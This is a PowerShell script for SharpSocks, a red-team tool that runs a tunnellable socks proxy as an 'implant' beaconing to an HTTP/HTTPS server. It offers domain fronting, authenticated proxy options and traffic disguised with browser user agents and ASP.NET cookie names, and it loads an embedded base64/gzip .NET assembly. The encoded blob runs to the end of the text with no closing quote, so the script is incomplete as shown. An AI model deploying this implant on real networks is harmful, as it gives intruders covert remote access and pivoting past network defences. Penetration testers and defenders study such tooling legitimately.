$Global:SocksClientLoaded = $False
$Global:SocksServerLoaded = $False
$Global:Socks = $null
$Global:BoolStart = $null
$iLogOutput = $null
$Comms = $null
function SharpSocks 
{
    <#
    .Synopsis
        Socks Proxy written in C# for .NET v4

        Tunnellable HTTP/HTTPS socks4a proxy written in C# and deployable via PowerShell

        SharpSocks 2017 Nettitude
        Rob Maslen @rbmaslen 

    .DESCRIPTION
        PS C:\> Usage: SharpSocks -Uri <Host> 
    .EXAMPLE
        Start the Implant(Client) specifying the web server (http://127.0.0.1:8081), the encryption keys and channel id. Also specify a list of URLs to use when making HTTP Request. Set the beacon time to 5 seconds 
        PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "site/review/access.php","upload/data/images" -Beacon 5000
    .EXAMPLE
        Same as above using different list of URLs
        PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "Upload","Push","Res" -Beacon 5000
    .EXAMPLE
        Sames as above but connect out via an authenticated proxy server 
        PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -ProxyUser bob -ProxyPass pass -ProxyDomain dom -ProxyUrl http://10.150.10.1:8080 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "Upload","Push","Res" -Beacon 500
    #>
    param(
    [Parameter(Mandatory=$True)][string]$Uri, 
    [Parameter(Mandatory=$False)]$URLs="Upload", 
    [Parameter(Mandatory=$False)][switch]$Server, 
    [Parameter(Mandatory=$False)][switch]$Client, 
    [Parameter(Mandatory=$False)][int]$SocksPort=43334, 
    [Parameter(Mandatory=$False)][string]$Channel,
    [Parameter(Mandatory=$False)][string]$IPAddress="0.0.0.0",
    [Parameter(Mandatory=$False)][string]$DomainFrontURL,
    [Parameter(Mandatory=$False)][int]$Beacon="2000",
    [Parameter(Mandatory=$False)][string]$Key,
    [Parameter(Mandatory=$False)][switch]$Insecure,
    [Parameter(Mandatory=$False)][string]$UserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
    [Parameter(Mandatory=$False)][string]$Cookie1="ASP.NET_SessionId",
    [Parameter(Mandatory=$False)][string]$Cookie2="__RequestVerificationToken",
    [Parameter(Mandatory=$False, HelpMessage="Certificate to be used by the web server, must be of type System.Security.Cryptography.X509Certificates.X509Certificate2")][System.Security.Cryptography.X509Certificates.X509Certificate2]$TLSServerCertificate,
    [Parameter(Mandatory=$False)][string]$ProxyURL,
    [Parameter(Mandatory=$False)][string]$ProxyDomain,
    [Parameter(Mandatory=$False)][string]$ProxyUser,
    [Parameter(Mandatory=$False)][string]$ProxyPassword
    )

    echo "[-] Loading Assemblies"
    if ($psversiontable.CLRVersion.Major -lt 3) {
        echo "Not running on CLRVersion 4 or above. Try 'migrate' to use unmanaged powershell"
    } 
    else {
        if (($SocksClientLoaded -ne "TRUE") -and ($Client.IsPresent)) {
            $Script:SocksClientLoaded = "TRUE"
            echo "[-] Loading Client Assembly"
            $PS = "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